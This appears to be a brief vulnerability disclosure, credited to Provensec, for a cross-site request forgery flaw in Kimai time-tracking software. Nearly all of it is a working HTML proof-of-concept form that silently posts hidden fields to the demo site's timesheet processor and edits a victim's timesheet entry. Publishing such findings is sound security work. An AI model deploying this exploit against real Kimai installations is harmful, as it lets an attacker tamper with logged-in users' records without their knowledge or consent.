# Affected software: http://kimai.org
# Type of vulnerability: csrf
# URL: http://demo.kimai.org
# Discovered by: Provensec
# Website: http://www.provensec.com
# Description: csrf vulnerability in status edit mechanism  due to no csrf
token
# Proof of concept:
<html>

  <body>
    <form action="
http://demo.kimai.org/extensions/ki_timesheets/processor.php"
method="POST">
      <input type="hidden" name="id" value="7" />
      <input type="hidden" name="axAction"
value="add&#95;edit&#95;timeSheetEntry" />
      <input type="hidden" name="projectID" value="2" />
      <input type="hidden" name="filter" value="" />
      <input type="hidden" name="activityID" value="1" />
      <input type="hidden" name="filter" value="" />
      <input type="hidden" name="description"
value="ZxcZlololololololololoxcfrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr"
/>
      <input type="hidden" name="start&#95;day" value="14&#46;10&#46;2014"
/>
      <input type="hidden" name="end&#95;day" value="15&#46;10&#46;2014" />
      <input type="hidden" name="start&#95;time" value="14&#58;44&#58;07" />
      <input type="hidden" name="end&#95;time" value="02&#58;44&#58;07" />
      <input type="hidden" name="duration" value="12&#58;00&#58;00" />
      <input type="hidden" name="location" value="" />
      <input type="hidden" name="trackingNumber" value="" />
      <input type="hidden" name="comment" value="" />
      <input type="hidden" name="commentType" value="0" />
      <input type="hidden" name="userID" value="340622533" />
      <input type="hidden" name="budget" value="0&#46;00" />
      <input type="hidden" name="approved" value="0&#46;00" />
      <input type="hidden" name="statusID" value="1" />
      <input type="hidden" name="billable" value="0" />
      <input type="hidden" name="rate" value="0&#46;00" />
      <input type="hidden" name="fixedRate" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
